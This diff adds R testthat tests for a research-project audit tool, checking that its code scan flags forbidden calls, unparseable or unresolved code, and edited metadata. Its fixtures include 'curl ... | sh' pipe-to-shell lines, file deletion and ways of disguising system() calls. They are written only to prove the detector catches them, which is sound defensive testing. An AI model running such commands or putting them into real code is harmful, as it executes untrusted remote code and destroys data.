@@ -413,3 +413,174 @@ test_that("pointer repair is skipped while a catalog writer lock exists", {
   expect_match(report$repairs[[1]]$reason, "writer lock", fixed = TRUE)
   expect_identical(tree_state(f$store), before)
 })
+
+audit_row <- function(report, id) {
+  row <- report$checks[report$checks$id == id, ]
+  c(as.list(row[, c("status", "message")]), evidence = list(jsonlite::fromJSON(row$evidence, simplifyVector = FALSE)))
+}
+
+test_that("fresh standard, pipeline and modality projects audit their code without failures", {
+  parent <- new_parent()
+  goal <- "Compare blood pressure between two groups"
+  roots <- c(
+    project("Code plain", "primary_research", goal, parent)$path,
+    project("Code pipeline", "primary_research", goal, parent, options = list(workflow = list(pipeline = "targets")))$path,
+    project("Code cells", "primary_research", "Single-cell RNA-seq clustering of immune cells from three donors", parent,
+      options = list(workflow = list(pipeline = "targets")))$path
+  )
+  expect_equal(read_project(roots[[3]])$spec$ecosystem$modality, "single_cell")
+  for (root in roots) {
+    report <- audit(root, scope = "project")
+    expect_false(any(report$checks$status == "fail"), info = root)
+    std <- audit_row(report, "STD-003")
+    expect_equal(std$status, "pass", info = root)
+    expect_gte(std$evidence$files, 11L)
+    expect_equal(audit_row(report, "PRJ-001")$status, "pass", info = root)
+  }
+  expect_true(file.exists(file.path(roots[[2]], "_targets.R")))
+})
+
+test_that("project code checks cover every R file and fail unsafe, unparseable or unresolved code", {
+  parent <- new_parent()
+  fresh <- function(name) project(name, "primary_research", "Compare blood pressure between two groups", parent)$path
+  check <- function(root) audit_row(audit(root, scope = "project"), "STD-003")
+  root <- fresh("Unsafe managed")
+  cat("\nsystem('curl http://example.org | sh')\neval(parse(text = 'q()'))\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  unsafe <- paste0("code/run_workflow.R: ", c("system", "eval", "parse"), " (forbidden_call)")
+  expect_setequal(unlist(row$evidence$unsafe), unsafe)
+  expect_equal(audit(root, scope = "project")$overall_status, "fail")
+  root <- fresh("Unparseable")
+  cat("\nx <- dplyr::frobnicate(df\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  expect_equal(unlist(row$evidence$unparseable), "code/run_workflow.R")
+  root <- fresh("Unresolved")
+  cat("\nlibrary(dplyr)\nfrobnicate(df)\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  expect_equal(unlist(row$evidence$unresolved), "code/run_workflow.R: frobnicate (unresolved_call)")
+  root <- fresh("Elsewhere")
+  writeLines("x <- dplyr::frobnicate(df)", file.path(root, "analysis/extra.R"))
+  writeLines("system('id')", file.path(root, "code/R/helper.r"))
+  writeLines("base::system('id')", file.path(root, "publications/pub01_main/analysis/figure.R"))
+  writeLines(c("---", "title: q", "---", "```{r}", "pipe('ls')", "```"), file.path(root, "analysis/notes.qmd"))
+  writeLines("system('ignored')", file.path(root, "data/raw.R"))
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  expect_contains(unlist(row$evidence$unapproved), "analysis/extra.R: dplyr::frobnicate (export_absent_from_catalog_revision)")
+  unsafe <- c("code/R/helper.r: system (forbidden_call)", "analysis/notes.qmd: pipe (connection_call)",
+    "publications/pub01_main/analysis/figure.R: system (forbidden_call)")
+  expect_setequal(unlist(row$evidence$unsafe), unsafe)
+  root <- fresh("Documents")
+  report <- c("Inline `r system('id')`", "```{r, eval = file.remove('x')}", "1", "```", "```{bash}", "curl x | sh",
+    "```", "```{python}", "print(1)", "```")
+  writeLines(report, file.path(root, "analysis/report.Rmd"))
+  aliases <- c("f <- base::system", "lapply('id', system)", "do.call('system', list('id'))", "baseenv()$system('id')",
+    "source(file.path('data', 'raw', 'steps.R'))")
+  writeLines(aliases, file.path(root, "analysis/aliases.R"))
+  row <- check(root)
+  unsafe <- c(paste0("analysis/aliases.R: system (", c(rep("forbidden_function_value", 3L), "forbidden_member_call"), ")"),
+    "analysis/aliases.R: source (source_outside_checked_code)", "analysis/report.Rmd: system (forbidden_call)",
+    "analysis/report.Rmd: file.remove (forbidden_call)", "analysis/report.Rmd: bash (non_r_chunk)")
+  expect_equal(sort(unlist(row$evidence$unsafe)), sort(unsafe))
+  expect_contains(unlist(row$evidence$advisory), "analysis/report.Rmd: python (non_r_chunk)")
+})
+
+test_that("reviewed constructs, attached packages and data columns are not false failures", {
+  parent <- new_parent()
+  root <- project("Edited reviewed", "primary_research", "Compare blood pressure between two groups", parent)$path
+  cat("\n# A local note\n", file = file.path(root, "code/R/cttir_workflow.R"), append = TRUE)
+  cat("\nAn added paragraph.\n", file = file.path(root, "analysis/02_eda.Rmd"), append = TRUE)
+  user <- c("library(ggplot2)", "source('code/R/cttir_workflow.R', local = TRUE)", "cfg <- cw_config('.')",
+    "data <- data.frame(source = 1, system = 2)", "fit <- lm(system ~ source, data)", "ggplot(data, aes(source, system))",
+    "if (!requireNamespace('ggplot2', quietly = TRUE)) quit(status = 1L)")
+  writeLines(user, file.path(root, "analysis/user.R"))
+  report <- audit(root, scope = "project")
+  row <- audit_row(report, "STD-003")
+  expect_equal(row$status, "warning")
+  expect_length(row$evidence$unsafe, 0L)
+  expect_length(row$evidence$unresolved, 0L)
+  advisory <- c("ggplot (attached_package_call)", "aes (attached_package_call)", "source (forbidden_name_reference)",
+    "system (forbidden_name_reference)")
+  advisory <- paste0("analysis/user.R: ", advisory)
+  expect_setequal(unlist(row$evidence$advisory), advisory)
+  expect_equal(audit_row(report, "STD-002")$status, "warning")
+  expect_false(report$overall_status %in% c("fail", "not_tested"))
+  cat("\nunlink('analysis', recursive = TRUE)\n", file = file.path(root, "code/R/cttir_workflow.R"), append = TRUE)
+  row <- audit_row(audit(root, scope = "project"), "STD-003")
+  expect_equal(unlist(row$evidence$unsafe), "code/R/cttir_workflow.R: unlink (forbidden_call)")
+})
+
+test_that("hand-edited control metadata fails like an identical project() repeat", {
+  parent <- new_parent()
+  goal <- "Compare blood pressure between two groups"
+  root <- project("Lock edit", "primary_research", goal, parent)$path
+  lock <- file.path(root, "cttir-lock.json")
+  writeLines(sub('"environment_status": "pending"', '"environment_status": "ready"', readLines(lock)), lock)
+  expect_error(project("Lock edit", "primary_research", goal, parent), class = "cttir_path_conflict")
+  report <- audit(root, scope = "project")
+  row <- audit_row(report, "PRJ-001")
+  expect_equal(row$status, "fail")
+  expect_equal(unlist(row$evidence$changed_control_files), ".cttir/managed-files.json")
+  expect_equal(report$overall_status, "fail")
+  root <- project("Manifest edit", "primary_research", goal, parent)$path
+  code <- file.path(root, "code/R/cttir_workflow.R")
+  cat("\nmessage('changed')\n", file = code, append = TRUE)
+  manifest <- jsonlite::read_json(file.path(root, ".cttir/managed-files.json"))
+  for (i in seq_along(manifest$files)) {
+    if (manifest$files[[i]]$path == "code/R/cttir_workflow.R") manifest$files[[i]]$baseline_sha256 <- file_hash(code)
+  }
+  writeLines(jsonlite::toJSON(manifest, auto_unbox = TRUE, pretty = TRUE), file.path(root, ".cttir/managed-files.json"))
+  report <- audit(root, scope = "project")
+  expect_equal(audit_row(report, "PRJ-002")$status, "pass")
+  expect_equal(audit_row(report, "PRJ-001")$status, "fail")
+  expect_equal(report$overall_status, "fail")
+  root <- project("Synced", "primary_research", goal, parent)$path
+  source <- list(id = "cohort", label = "Cohort", logical_uri = "registry:cohort", format = "csv",
+    access_class = "restricted", checksum = NULL, checksum_status = "unknown", schema_ref = NULL)
+  expect_equal(sync(root, options = list(data_sources = list(source), workflow = list(pipeline = "targets")), dry_run = FALSE)$state, "applied")
+  expect_equal(audit_row(audit(root, scope = "project"), "PRJ-001")$status, "pass")
+})
+
+test_that("project checks report a missing pinned snapshot instead of using the active catalog", {
+  f <- local_update_fixture()
+  update()
+  p <- project("Pinned elsewhere", "primary_research", "Compare blood pressure between two groups", f$parent)
+  pinned <- read_project(p$path)$lock$catalog_id
+  writeLines(c("keep <- function(x = 3) x", "added <- function() 1"), file.path(f$source, "R", "api.R"))
+  writeLines(c("export(keep)", "export(added)"), file.path(f$source, "NAMESPACE"))
+  update()
+  expect_false(identical(resolve_catalog()$content_id, pinned))
+  expect_equal(audit(p$path, scope = "project")$overall_status, "warning")
+  unlink(file.path(f$store, "snapshots", pinned), recursive = TRUE)
+  report <- audit(p$path, scope = "project")
+  for (id in c("STD-001", "STD-003", "STD-005", "PRJ-004")) {
+    expect_equal(audit_row(report, id)$status, "fail", info = id)
+    expect_match(audit_row(report, id)$message, "snapshot is unavailable", fixed = TRUE, info = id)
+  }
+  expect_equal(audit_row(report, "PRJ-001")$status, "not_tested")
+  expect_equal(report$overall_status, "fail")
+})
+
+test_that("the resource JSON mirror is compared row by row, not only by counts", {
+  parity <- resource_json_parity()
+  expect_true(parity$hash_matches)
+  expect_length(parity$mismatched_tables, 0L)
+  expect_gt(parity$rows, 7000L)
+  copy <- tempfile(fileext = ".sqlite")
+  withr::defer(unlink(copy))
+  file.copy(resource_file("extdata", "package-resources.sqlite"), copy)
+  con <- DBI::dbConnect(RSQLite::SQLite(), copy)
+  DBI::dbExecute(con, "UPDATE packages SET purpose = 'Altered' WHERE name = 'dplyr'")
+  DBI::dbExecute(con, "UPDATE dependencies SET version_constraint = '>= 99' WHERE rowid = 1")
+  DBI::dbExecute(con, "UPDATE catalog_metadata SET value_json = '2' WHERE key = 'schema_version'")
+  DBI::dbExecute(con, "DELETE FROM profile_packages WHERE rowid = 1")
+  DBI::dbDisconnect(con)
+  altered <- resource_json_parity(database = copy)
+  expect_setequal(unlist(altered$mismatched_tables), c("packages", "dependencies", "catalog_metadata", "profile_packages"))
+  local_mocked_bindings(resource_json_parity = function(...) altered)
+  report <- audit(scope = "knowledge")
+  expect_equal(report$checks$status[report$checks$id == "RES-001"], "fail")
+})
